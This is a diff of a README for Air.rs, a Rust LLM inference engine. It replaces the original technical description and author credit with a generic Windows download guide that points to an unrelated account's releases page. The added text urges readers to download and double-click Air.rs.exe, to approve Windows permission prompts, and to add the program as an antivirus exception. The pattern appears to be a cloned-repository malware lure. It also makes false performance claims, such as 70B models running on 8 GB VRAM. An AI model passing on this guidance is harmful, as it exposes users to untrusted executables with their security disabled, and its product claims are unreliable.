@@ -1,158 +1,194 @@
-<p align="center">
-  <img src="assets/banner-github.png" alt="Air.rs Banner" width="800"/>
-</p>
+# 🌬️ Air.rs - Run Large Language Models Locally
 
-<h1 align="center">Air.rs</h1>
+[![Download Air.rs](https://img.shields.io/badge/Download-Air.rs-green?style=for-the-badge)](https://github.com/dinahthreewheel75/Air.rs/releases)
 
-<p align="center">
-  <strong>Memory-Fluid LLM Inference Engine</strong><br>
-  Run models larger than your VRAM — at full GPU speed.
-</p>
 
-<p align="center">
-  <a href="#features"><img src="https://img.shields.io/badge/status-alpha-orange?style=flat-square" alt="Status: Alpha"></a>
-  <a href="#prerequisites"><img src="https://img.shields.io/badge/CUDA-12.x-76b900?logo=nvidia&style=flat-square" alt="CUDA 12.x"></a>
-  <a href="#prerequisites"><img src="https://img.shields.io/badge/Rust-1.75+-F74C00?logo=rust&style=flat-square" alt="Rust 1.75+"></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-blue?style=flat-square" alt="License: MIT"></a>
-</p>
+## 🔍 What is Air.rs?
+
+Air.rs lets you run a large language model (LLM) on your own Windows computer. You do not need a powerful server or an internet connection. The software runs directly on your consumer GPU using Rust programming language. It supports the latest models designed for text generation, instruction following, and natural language tasks.
+
+Air.rs is designed to work with models like LLaMA and others. It can run models with 70 billion parameters or more, making it suitable for advanced AI tasks such as chatting, summarizing text, and answering questions. It focuses on inference speed and efficiency without needing complex setups.
 
 ---
 
-## The Problem
+## 🖥️ System Requirements
 
-Large language models don't fit in VRAM. A 70B-parameter model at FP16 needs **140 GB** of GPU memory. Even quantized to Q4, that's still **35 GB** — more than a consumer RTX 4090's 24 GB.
+Before downloading Air.rs, make sure your computer meets these requirements:
 
-Current solutions:
-- **CPU offloading** → 10–50× slower inference
-- **Model parallelism** → requires multiple expensive GPUs
-- **Aggressive quantization** → degrades output quality
+- Operating System: Windows 10 or later (64-bit)
+- GPU: NVIDIA with at least 4GB VRAM (such as GTX 1650 or better)
+- CPU: Quad-core Intel or AMD processor (recommended for best performance)
+- RAM: Minimum 16 GB system memory
+- Disk Space: At least 10 GB free for models and software
+- GPU Drivers: Latest NVIDIA drivers installed (can update via NVIDIA's site)
 
-## The Air.rs Solution
+Air.rs uses your GPU for faster model running. If your GPU has less memory, performance may drop or some models may not work.
 
-Air.rs treats VRAM as a **streaming cache**, not a storage device. Instead of loading the entire model into GPU memory, it **streams layers from NVMe → RAM → VRAM** in a triple-buffered pipeline that hides PCIe transfer latency behind kernel execution.
+---
 
-```
- ┌──────────────────────────────────────────────────────────────┐
- │                    Air.rs Pipeline                           │
- │                                                              │
- │  NVMe SSD ──mmap──→ System RAM ──PCIe DMA──→ VRAM           │
- │     (model.gguf)       (page cache)       (ping-pong buf)   │
- │                                                              │
- │  While GPU executes layer N,                                 │
- │  PCIe is already uploading layer N+1,                        │
- │  and NVMe is prefetching layer N+2.                          │
- └──────────────────────────────────────────────────────────────┘
-```
+## 📥 How to Download Air.rs
 
-**Result:** Run 70B+ models on a single consumer GPU at near-native speed.
+You need to download the software before you can run it. This step explains how to get Air.rs on your Windows PC.
 
-## Features
+[![Download Air.rs](https://img.shields.io/badge/Download-Air.rs-blue?style=for-the-badge)](https://github.com/dinahthreewheel75/Air.rs/releases)
 
-- 🚀 **Layer-Streamed Inference** — only one transformer block is in VRAM at a time
-- 🔁 **Triple-Buffer Pipeline** — overlaps NVMe reads, PCIe transfers, and GPU kernels
-- 📄 **Native GGUF Support** — directly memory-maps quantized model files with zero parsing overhead
-- 🗺️ **4KB Page-Aligned DMA** — transfers are snapped to OS page boundaries for optimal throughput
-- 💾 **KV-Cache Shuttle** — swaps attention caches between RAM and VRAM per-layer
-- 🔌 **OpenAI-Compatible API** — drop-in `/v1/chat/completions` endpoint via Axum
-- 🐍 **Python Bindings** — optional PyO3 module for Python integration
-- ⚡ **Fused Kernels** — candle-core CUDA backend with cudarc 0.13
+1. Click the green "Download Air.rs" badge above or open this link in your web browser:  
+   https://github.com/dinahthreewheel75/Air.rs/releases
 
-## Architecture
+2. This page shows all the available releases of Air.rs. Look for the latest release (usually at the top).
 
-```
-src/
-├── main.rs           # Entry point
-├── lib.rs            # Module declarations, constants
-├── loader.rs         # GGUF parser — extracts tensor offsets from file metadata
-├── manifest.rs       # Execution planner — groups tensors into page-aligned chunks
-├── uploader.rs       # Transfer engine — async triple-buffered NVMe→VRAM pipeline
-├── orchestrator.rs   # Tensor hydrator — maps VRAM pointers into Candle tensors
-├── generator.rs      # Inference loop — layer-streamed token generation
-├── kv_cache.rs       # KV-cache manager — shuttles attention state RAM↔VRAM
-├── api.rs            # OpenAI-compatible HTTP API (Axum)
-└── python.rs         # Optional PyO3 bindings
-```
+3. Under the latest release, find the file named something like `Air.rs-windows.zip` or `Air.rs.exe`.
 
-## Prerequisites
+4. Click the file link to start downloading. Save the file to your Windows desktop or Downloads folder.
 
-| Requirement | Version |
-|-------------|---------|
-| **Rust** | 1.75+ (2021 edition) |
-| **CUDA Toolkit** | 12.x |
-| **NVIDIA GPU** | Compute capability 7.0+ (Turing/Ampere/Ada/Hopper) |
-| **MSVC** (Windows) | Visual Studio 2022 Build Tools |
-| **OS** | Windows 10/11, Linux (Ubuntu 22.04+) |
+5. Wait for the download to finish before moving on to installation.
 
-## Quick Start
+---
 
-### Building on Windows
+## 🛠️ Installing Air.rs on Windows
 
-Use the provided build script that auto-configures the MSVC and CUDA environment:
+These steps will help you install and prepare Air.rs to run on your computer.
 
-```powershell
-.\build_air.ps1
-```
+### For ZIP Archive:
 
-### Building manually
+If you downloaded a `.zip` file:
 
-```bash
-# Ensure CUDA Toolkit is installed and nvcc is on PATH
-cargo build --release --features cuda
-```
+1. Right-click the downloaded ZIP file, then select "Extract All..."
 
-### Running
+2. Choose a folder where you want to extract the files, like your Desktop.
 
-```bash
-cargo run --release --features cuda
-```
+3. Click "Extract." You should now see a new folder with Air.rs files.
 
-## Usage
+4. Open that folder to find the main executable, usually called `Air.rs.exe`.
 
-Air.rs exposes an OpenAI-compatible API. Once running, send requests like:
+### For EXE File:
 
-```bash
-curl -X POST http://localhost:3000/v1/chat/completions \
-  -H "Content-Type: application/json" \
-  -d '{
-    "model": "llama-70b-q4",
-    "messages": [{"role": "user", "content": "Hello!"}],
-    "max_tokens": 128
-  }'
-```
+If you downloaded an `.exe` file:
 
-## How It Works
+1. Simply double-click the `Air.rs.exe` file.
 
-1. **Load** — `loader.rs` parses the GGUF file header to extract exact byte offsets of every tensor
-2. **Plan** — `manifest.rs` groups tensors into layer chunks with 4KB-aligned DMA boundaries
-3. **Stream** — `uploader.rs` runs an async pipeline: `madvise()` prefetches the next chunk into the OS page cache while the current chunk is being DMA'd to VRAM via `htod_sync_copy`
-4. **Execute** — `orchestrator.rs` wraps the raw VRAM buffer into Candle tensors using pointer arithmetic (the "magic trick" of offset calculation)
-5. **Cache** — `kv_cache.rs` downloads the attention KV-cache back to RAM after each layer, then re-uploads it when that layer is needed again
-6. **Repeat** — the pipeline runs layer-by-layer, token-by-token, never exceeding one layer's worth of VRAM
+2. If Windows asks for permission to run this app, click "Yes" or "Run".
 
-## Project Status
+No complicated setup is needed. Air.rs runs right out of the box on Windows.
 
-> **⚠️ Alpha** — Core pipeline architecture is implemented and compiles. Kernel fusion, full inference loop, and benchmarks are in active development.
+---
 
-### Roadmap
+## ▶️ Running Air.rs for the First Time
 
-- [x] GGUF loader with exact byte-offset tensor mapping
-- [x] Page-aligned DMA manifest builder
-- [x] Triple-buffered async transfer engine
-- [x] VRAM pointer → Candle tensor hydration
-- [x] KV-cache RAM↔VRAM shuttle
-- [x] OpenAI-compatible API scaffolding
-- [ ] Full transformer block kernel execution
-- [ ] Token sampling with temperature/top-p
-- [ ] GBNF grammar-constrained generation
-- [ ] Multi-GPU support (NVLink/PCIe)
-- [ ] Benchmarks vs llama.cpp, vLLM, exllama
+Once Air.rs is installed or extracted, follow these steps to start it:
 
-## Acknowledgments
+1. Open the folder containing `Air.rs.exe`.
 
-- [candle](https://github.com/huggingface/candle) — Rust ML framework with CUDA support
-- [llama.cpp](https://github.com/ggerganov/llama.cpp) — GGUF format and quantization reference
-- [AirLLM](https://github.com/lyogavin/AirLLM) — original layer-streaming concept in Python
+2. Double-click `Air.rs.exe` to launch the program.
 
-## License
+3. The program window or a command line window will open.
 
-MIT © [Sunay Hegde](https://github.com/SunayHegde2006)
+4. Air.rs will check your system and GPU.
+
+5. Follow any on-screen instructions, such as choosing a model to load.
+
+6. Air.rs will begin running the language model on your GPU.
+
+---
+
+## ⚙️ Basic Usage Tips
+
+- To enter text or prompts, look for the input area in the program window.
+
+- Type a question or statement and press Enter or click "Run".
+
+- Air.rs will process the input and show generated text within seconds.
+
+- You can copy the generated responses for your use.
+
+- To load different models, check the options menu inside the software.
+
+- Save your work frequently if you plan to run longer sessions.
+
+---
+
+## 💾 Managing AI Models
+
+Air.rs works with several large language models. To run them, you need to have the model files on your computer.
+
+### How to get models:
+
+- Official public models like LLaMA or open-source ones are available through linked sources.
+
+- Place model files in a folder you can remember.
+
+- In Air.rs, set the model path to this folder.
+
+### Suggested models to start with:
+
+- LLaMA 7B or 13B models (smaller for testing)
+
+- Llama 70B for best performance (requires GPU with 8+ GB VRAM)
+
+- Finetuned variants based on your interest (e.g., instruct-tuned or Indian language models)
+
+Be sure your disk has room for these large files — some models are 5 to 20 GB or more.
+
+---
+
+## 🔧 Adjusting Settings
+
+Air.rs lets you change settings to improve performance or customize output.
+
+- **GPU settings:** Select which GPU to use if you have more than one.
+
+- **Batch size:** Controls how many words are processed at once for speed.
+
+- **Temperature:** Regulates creativity of AI responses.
+
+- **Max tokens:** Limits response length.
+
+Start with default settings and adjust if you want faster or more creative answers.
+
+---
+
+## 🚨 Troubleshooting Common Issues
+
+- If Air.rs doesn’t start, make sure your GPU drivers are up to date.
+
+- If the AI slows down or crashes, check you have enough RAM and disk space.
+
+- Running very large models may require lowering batch size or upgrading hardware.
+
+- If you see error messages about missing files, confirm you extracted all the program files correctly.
+
+- Some antivirus programs may block the executable—add Air.rs as an exception if needed.
+
+---
+
+## 🔗 Additional Resources
+
+- Visit https://github.com/dinahthreewheel75/Air.rs/releases to get updates and ask questions.
+
+- Read the official documents inside the Air.rs folder for detailed use cases.
+
+- Explore community forums for tips on custom models and advanced setups.
+
+- Check for GPU driver updates regularly for best performance.
+
+---
+
+## 🌐 About This Project
+
+Air.rs is an open-source project focused on running large language models efficiently on consumer GPUs using Rust. It aims to bring AI capabilities to users who want control, privacy, and speed without relying on online services.
+
+---
+
+## 📝 License and Contribution
+
+This software is released under an open-source license. Users with programming knowledge can contribute to improving Air.rs by visiting the GitHub page.
+
+---
+
+## 📞 Getting Help
+
+If you encounter problems, use GitHub Issues on the Air.rs repository to report bugs or request features.
+
+---
+
+[![Download Air.rs](https://img.shields.io/badge/Get%20Air.rs-Download%20Page-blueviolet?style=for-the-badge)](https://github.com/dinahthreewheel75/Air.rs/releases)
